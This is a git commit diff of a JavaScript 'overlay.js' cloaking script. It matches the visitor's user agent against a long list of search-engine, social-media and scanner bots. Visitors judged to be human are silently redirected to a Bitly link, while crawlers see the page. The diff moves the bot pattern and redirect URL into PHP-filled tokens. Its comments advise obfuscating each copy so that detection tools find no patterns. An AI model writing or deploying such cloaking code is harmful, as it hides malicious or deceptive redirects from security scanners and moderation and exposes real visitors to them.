0420a1ea46dbae1785eaf35d39e6193212dfde48
Prescience <65471523+prescience-data@users.noreply.github.com>
2020-06-01 10:46:23 +1000

    Update overlay.js

--- overlay.js
+++ overlay.js
@@ -1,15 +1,18 @@
 /**
  * Demo example of redirecting if crawler.
  * Naturally you would want to implement more robust bot checking depending on your use case.
- * You'll want to run this script through https://obfuscator.io/ to get a unique version each time to avoid any patterns.
- * Note that the default script pulls its Bitly url from PHP where if you re-obfuscate you will need to add it to this file or replace 'ADD_YOUR_BITLY_LINK' with php code to echo the link variable.
+ * You'll want to run this script through https://obfuscator.io to get a unique version each time to avoid any patterns.
+ * Note there are PHP sprintf('%s') tokens in the script as it is meant to be used with the 'header.php' component to generate these variables.
+ * If you wish to use this as a standalone script, replace the 'crawlerUserAgentPattern' token with a regex user agent string, and the redirectUrl token with your bitly url.
  *
  */
 
+var redirectUrl = '%s';
+var crawlerUserAgentPattern = '%s';
+
 function checkUserAgent() {
 
-	var pattern = '(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)';
-	var test = new RegExp(pattern, 'i');
+	var test = new RegExp(crawlerUserAgentPattern, 'i');
 	var userAgent = navigator.userAgent;
 	return !test.test(userAgent);
 }
@@ -39,7 +42,7 @@ function checkFeatures() {
 }
 
 if (checkUserAgent() && checkFeatures()) {
-	window.location.replace('ADD_YOUR_BITLY_LINK');
+	window.location.replace(redirectUrl);
 }
 else {
 	document.addEventListener('DOMContentLoaded', function () {
